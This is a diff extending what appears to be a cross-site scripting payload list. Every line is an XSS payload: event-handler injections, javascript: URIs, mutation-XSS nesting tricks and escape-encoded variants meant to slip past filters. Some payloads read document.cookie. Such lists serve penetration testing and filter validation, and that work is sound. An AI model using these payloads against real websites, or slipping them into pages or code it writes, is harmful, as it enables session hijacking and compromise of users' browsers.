@@ -15,3 +15,24 @@ javascript:alert(1)
 <audio src=x onerror=alert(1)>
 <img onanimationstart=alert(1) style=animation-name:x src=x>
 <div onpointerenter=alert(1) style=width:100%;height:100%>x</div>
+"><svg/onload=alert(1)>
+<svg/onload=alert(1)>
+"><script>alert(document.cookie)</script>
+<a href=javascript:alert(1)>x</a>
+<form><button formaction=javascript:alert(1)>X</button></form>
+<template><svg onload=alert(1)></template>
+<math><mtext><table><mglyph><style></math><img src onerror=alert(1)>
+<isindex type=image src=x onerror=alert(1)>
+<img src=x onerror=al\u0065rt(1)>
+ja\x76ascript:alert(1)
+<div style="width:100px;height:100px" onmouseenter=alert(1)>hover</div>
+<img src=x onerror=alert(document.cookie)>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+<form><button formaction=javascript:alert(1)>x
+<data><img src=x onerror=alert(1)></data>
+<meter value=2 max=1 onmouseover=alert(1)>x</meter>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<body onpageshow=alert(1)>
+'><svg onload=alert(1)>
